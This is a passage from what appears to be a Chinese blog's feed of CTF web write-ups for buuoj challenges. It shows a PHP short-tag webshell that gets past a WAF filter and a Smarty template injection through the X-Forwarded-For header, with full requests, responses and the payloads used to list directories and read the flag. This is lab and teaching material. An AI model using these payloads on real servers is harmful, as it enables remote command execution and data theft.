class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;<span class="comment">//action=upload时，将data写入目录的index.php中，如果没有data参数，则将data设定为空，并且data需要经过waf检测</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那这里就很简单了，将我们的shell写进<code>$dir</code>内即可</p><p>那要怎么写呢？这里过滤了空格、单引号、下划线、php、分号、波浪号、大括号、eval、+、^</p><h2><span id="php短标签"> PHP短标签</span></h2><p>在之前的webshell里讲过，<code>&lt;?=``?&gt;</code>  相当于命令执行</p><p>其中的&lt;?= 相当于echo</p><p>所以可以直接这样写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`ls`?&gt;</span><br></pre></td></tr></table></figure><p>或者是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?echo%09system(&quot;ls&quot;)?&gt;</span><br></pre></td></tr></table></figure><p>然后按命令执行做就可以了，空格用%09替换，单引号用双引号替换，然后访问沙箱路径即可获得回显</p><h1><span id="ciscn2019-华东南赛区web11"> [CISCN2019 华东南赛区]Web11</span></h1><p>Very水的一个题，感觉不如攻防世界的smarty…</p><p>页面显示的是IP Address API</p><p>并且写道Build  with Smarty</p><p>可以推测应该是smarty的xff注入，直接打开burp抓包，修改xff测试：</p><p>Request包：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: node4.buuoj.cn:<span class="number">28697</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">110.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span> Edg/<span class="number">110.0</span>.<span class="number">1587.50</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">X-Forwarded-For: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">X-Forwarded: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">Forwarded-For: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">Forwarded: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">X-Requested-With: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">X-Forwarded-Proto: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">X-Forwarded-Host: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">X-remote-IP: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">X-remote-addr: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">True-Client-IP: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">X-Client-IP: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">Client-IP: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">X-Real-IP: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">Ali-CDN-Real-IP: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">Cdn-Src-Ip: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">Cdn-Real-Ip: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">CF-Connecting-IP: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">X-Cluster-Client-IP: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">WL-Proxy-Client-IP: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">Proxy-Client-IP: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">Fastly-Client-Ip: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">True-Client-Ip: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">X-Originating-IP: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">X-Host: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">X-Custom-IP-Authorization: &#123;1+1&#125;</span></span><br><span class="line"><span class="comment">Content-Length: 2</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure><p>Respond包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.14.2</span><br><span class="line">Date: Sat, 25 Feb 2023 15:32:00 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: PHP/7.3.5</span><br><span class="line">Content-Length: 3905</span><br><span class="line"></span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;A Simple IP Address API&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/bootstrap.min.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;row&quot;&gt;</span><br><span class="line">        &lt;div style=&quot;float:left;&quot;&gt;</span><br><span class="line">            &lt;h1&gt;IP&lt;/h1&gt;</span><br><span class="line">            &lt;h2 class=&quot;hidden-xs hidden-sm&quot;&gt;A Simple Public IP Address API&lt;/h2&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">&lt;div style=&quot;float:right;margin-top:30px;&quot;&gt;Current IP:2&lt;/div&gt;</span><br><span class="line">&lt;!-- 可以看到这里的current IP:2--&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;why row&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;col-xs-12&quot;&gt;</span><br><span class="line">            &lt;h2&gt;Why use?&lt;/h2&gt;</span><br><span class="line">            &lt;div class=&quot;row&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;col-xs-offset-1 col-xs-10&quot;&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                        Do you need to get the public IP address ? Do you have the requirements to obtain the servers’ public IP address? Whatever the reason,sometimes a public IP address API are useful.</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                        You should use this because:</span><br><span class="line">                    &lt;/p&gt;&lt;ul&gt;</span><br><span class="line">                    &lt;li&gt;You can initiate requests without any limit.&lt;/li&gt;</span><br><span class="line">                    </span><br><span class="line">                    &lt;li&gt;Does not record the visitor information.&lt;/li&gt;</span><br><span class="line">                    </span><br><span class="line">                    &lt;/ul&gt;</span><br><span class="line">                    &lt;p&gt;&lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;api row&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;col-xs-12&quot;&gt;</span><br><span class="line">            &lt;h2&gt;API Usage&lt;/h2&gt;</span><br><span class="line">            &lt;div class=&quot;row&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;col-xs-offset-1 col-xs-11&quot;&gt;</span><br><span class="line">                    </span><br><span class="line">                    &lt;div class=&quot;table-responsive&quot;&gt;</span><br><span class="line">                        &lt;table class=&quot;table table-striped table-bordered table-hover&quot;&gt;</span><br><span class="line">                            &lt;thead&gt;</span><br><span class="line">                            &lt;tr&gt;</span><br><span class="line">                                &lt;td&gt;-&lt;/td&gt;</span><br><span class="line">                                &lt;td&gt;API URI&lt;/td&gt;</span><br><span class="line">                                &lt;td width=&quot;50px&quot;&gt;Type&lt;/td&gt;</span><br><span class="line">                                &lt;td&gt;Sample Output&lt;/td&gt;</span><br><span class="line">                            &lt;/tr&gt;</span><br><span class="line">                            &lt;/thead&gt;</span><br><span class="line">                            &lt;tbody&gt;</span><br><span class="line">                            &lt;tr&gt;</span><br><span class="line">                                &lt;td&gt;get IP&lt;/td&gt;</span><br><span class="line">                                &lt;td&gt;&lt;code&gt;http://node4.buuoj.cn:28697/api&lt;/code&gt;&lt;/td&gt;</span><br><span class="line">                                &lt;td&gt;&lt;code&gt;text/html&lt;/code&gt;&lt;/td&gt;</span><br><span class="line">                                &lt;td&gt;&lt;code&gt;8.8.8.8&lt;/code&gt;&lt;/td&gt;</span><br><span class="line">                            &lt;/tr&gt;</span><br><span class="line">                            &lt;tr&gt;</span><br><span class="line">                                &lt;td&gt;get XFF(X-Forwarded-For)&lt;/td&gt;</span><br><span class="line">                                &lt;td&gt;&lt;code&gt;http://node4.buuoj.cn:28697/xff&lt;/code&gt;&lt;/td&gt;</span><br><span class="line">                                &lt;td&gt;&lt;code&gt;text/html&lt;/code&gt;&lt;/td&gt;</span><br><span class="line">                                &lt;td&gt;&lt;code&gt;8.8.8.8&lt;/code&gt;&lt;/td&gt;</span><br><span class="line">                            &lt;/tr&gt;</span><br><span class="line">                            </span><br><span class="line">                            </span><br><span class="line">                            &lt;/tbody&gt;</span><br><span class="line">                        &lt;/table&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;examples row&quot;&gt;</span><br><span class="line">        </span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;row&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;col-xs-12&quot;&gt;</span><br><span class="line">            &lt;h2 style=&quot;margin-bottom:0;&quot;&gt;Connection&lt;/h2&gt;</span><br><span class="line">            &lt;div class=&quot;row&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;col-xs-offset-1 col-xs-10&quot;&gt;</span><br><span class="line">                    &lt;h3&gt;Request-Header&lt;/h3&gt;</span><br><span class="line">                    &lt;pre&gt;GET / HTTP/2.0</span><br><span class="line">Host: www.ip.la</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Dnt: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36</span><br><span class="line"></span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;footer&gt;</span><br><span class="line">        &lt;p style=&quot;text-align:center;font-size:14px;&quot;&gt;Build With Smarty !&lt;/p&gt;</span><br><span class="line">    &lt;/footer&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>可以发现执行了加法运算</p><p>将xff修改：X-Forwarded-For: {system(‘ls /’)}</p><p>Request包：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: node4.buuoj.cn:<span class="number">28697</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">110.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span> Edg/<span class="number">110.0</span>.<span class="number">1587.50</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">X-Forwarded-For: &#123;system(&#x27;ls /&#x27;)&#125;</span></span><br><span class="line"><span class="comment">Content-Length: 4</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure><p>Response包：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=<span class="string">&quot;float:right;margin-top:30px;&quot;</span>&gt;Current IP:bin</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">usr</span><br><span class="line"><span class="keyword">var</span></span><br><span class="line"><span class="keyword">var</span>&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>可以看到成功了，直接读flag即可</p><p>X-Forwarded-For: {system(‘cat /f*’)}</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">response包：</span><br><span class="line">&lt;div style=<span class="string">&quot;float:right;margin-top:30px;&quot;</span>&gt;Current IP:<span class="meta">&lt;?php</span> <span class="variable">$flag</span>=<span class="string">&quot;flag&#123;b9aaeb9b-a5d7-4908-bd35-f6b4763c1ac4&#125;&quot;</span>;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$flag</span>=<span class="string">&quot;flag&#123;b9aaeb9b-a5d7-4908-bd35-f6b4763c1ac4&#125;&quot;</span>;&lt;/div&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;做做buuoj上的web题，本萌新纯采集，轻喷（（（&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Web WriteUp" scheme="http://example.com/categories/CTF-Web-WriteUp/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
</feed>
